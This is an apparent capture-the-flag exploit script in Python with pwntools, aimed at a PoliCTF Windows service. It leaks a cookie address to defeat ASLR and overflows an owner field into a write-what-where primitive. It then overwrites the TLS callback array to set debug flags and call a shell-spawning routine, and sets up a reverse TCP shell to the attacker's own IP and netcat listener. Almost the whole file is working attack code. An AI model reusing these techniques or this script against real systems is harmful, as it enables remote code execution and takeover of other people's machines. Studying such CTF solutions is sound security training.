from pwn import *
import time

r=remote("win.chall.polictf.it", 31337)
#set here your ip address&port; start nc -l -p <your port> before continuing
yourIP="111.222.333.444"
yourPort="1234"

#context.log_level = "DEBUG"

def ToHexStr(s):
	s2=''
	for c in s:
		s2+=hex(ord(str(c)))[2::].rjust(2,'0')
	return s2

def ToByteArr(hexstr):
	return hexstr.decode("hex")

def ReadMenu():
	r.recvuntil('0-Exit\r\n')

def SetIpPort(ip,port):
	r.sendline('1\r')
	r.recvuntil('address:\r\n')
	r.sendline(ip+'\r')
	r.recvuntil('port:\r\n')
	r.sendline(port+'\r')
	r.recvuntil('Thanks!\r\n')

def PrintIpPort():
	r.sendline('5\r')
	r.recvuntil('Port: ')
	r.recvuntil('\r\n')#after port

def Connect():
	r.sendline('2\r')
	return r.recvuntil('\r\n')

def PrintShellcode():
	r.sendline('4\r')
	r.recvuntil('anyway:\r\n')
	return r.recvuntil('and so on...\r\n')[:-14]

def SetOwner(owner):
	r.sendline('6\r')
	r.recvuntil('owner:\r\n')
	hexowner=ToHexStr(owner)
	r.sendline(hexowner+'\r')

def Exit():
	r.sendline('0\r')

#---MAIN---
#.data section
securityCookieRVA=0x5000
tlsCallbacksArrayRVA=0x5044
ownerPtrRVA=0x5020
#.text section
spawnShellRVA=0x1560
setDbgMode1RVA=0x2DF0 #data section
setDbgMode2RVA=0x2E10 #pointer on heap

ReadMenu()
log.info('Leaking data...')
shellcode=PrintShellcode()
shDataLeakOffset=0x7*2
dataLeak=ToByteArr(shellcode[shDataLeakOffset:shDataLeakOffset+8])
securityCookieVA=u32(dataLeak)
imageBase=securityCookieVA-securityCookieRVA
log.success('leaked stack cookie address: {0}'.format(hex(securityCookieVA)))
log.info('image base:{0}'.format(hex(imageBase)))#aslr defeated

log.info('Fixing addresses...')
tlsCallbacksArrayVA=imageBase+tlsCallbacksArrayRVA
setDbgMode1VA=imageBase+setDbgMode1RVA #stdcall with 1 dummy parameter
setDbgMode2VA=imageBase+setDbgMode2RVA #same
spawnShellVA=imageBase+spawnShellRVA
ownerPtrVA=imageBase+ownerPtrRVA


ReadMenu()
log.info('Setting write-what-where with overflow')
owner1="Nesos\x00AA"+p32(ownerPtrVA)
SetOwner(owner1) #overflow cause write-what-where; setting where=self (because next to it there is a nice pointer)

ReadMenu()
log.info('overwriting where pointer with tls array+setting debug flag1')
owner2=p32(tlsCallbacksArrayVA)+p32(ownerPtrVA+8)+p32(1) #set where=tls arr;ptr malloced=next;next=1 (so debug mode done)
SetOwner(owner2)

ReadMenu()
log.info('setting tls array so it will set debug flag2 and 3 + spawn shell')
owner3=p32(setDbgMode1VA)+p32(setDbgMode2VA)+p32(spawnShellVA)
SetOwner(owner3) #write tls array to set remaining 2 dbgmode cheks and spawn shell
'''
debugMode functions are stdcall 1 parameter, spawnShell 0 parameters
original tls should be stdcall with 3 parameters
but at ret windows does mov esp,esi so we don't care about corrupting stack pointer, windows will fix it for us.
using normal rop would be more problematic because we have 3 overwrite and 3 calls but debugfunctions pop 1 parameter
'''

ReadMenu()
log.info('Setting IP&Port of the reverse tcp connection')
#SetIpPort("127.0.0.1","1235")
SetIpPort(yourIP,yourPort)
ReadMenu()
log.info('Connecting...')
connectResult=Connect() #can be done in any moment
if (connectResult=='Connection established, now spawn the shell\r\n'):
	log.success('Connected!')
else:
	log.failure('Error: {0}'.format(connectResult))
	r.interactive()


ReadMenu()
log.info('Exiting triggering the tls and so the shell')
Exit() #trigger the tls and the shell, also works with ExitProcess
#r.interactive()
log.info('Waiting exit+spawn shell to complete...')
time.sleep(2)
r.close()#when the connection is closed process is killed so we must wait that exit is completed and also tls is called (by the os on exiting) or we will not have shell
log.success('Done!!, you should have your shell in nc')
